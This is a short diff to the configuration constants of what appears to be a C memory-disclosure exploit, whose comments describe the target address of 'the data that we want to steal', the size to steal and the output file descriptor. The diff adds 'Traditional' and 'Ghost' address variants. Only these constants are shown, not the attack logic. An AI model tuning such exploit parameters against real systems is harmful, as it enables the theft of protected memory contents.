@@ -13,10 +13,16 @@
  */
 
 /* Define the target address containing the data that we want to steal */
-#define TARGET 0x425860
+#if 1
+/* Traditional version */
+#define TARGET 0x800808040
+#else
+/* Ghost version */
+#define TARGET 0xffffff0000808040
+#endif
 
 /* Define the size of the data that we want to steal */
-#define SIZE 0xc
+#define SIZE 0x3
 
 /* Define the file descriptor to which the stolen data should be written */
 #define FD 0x1
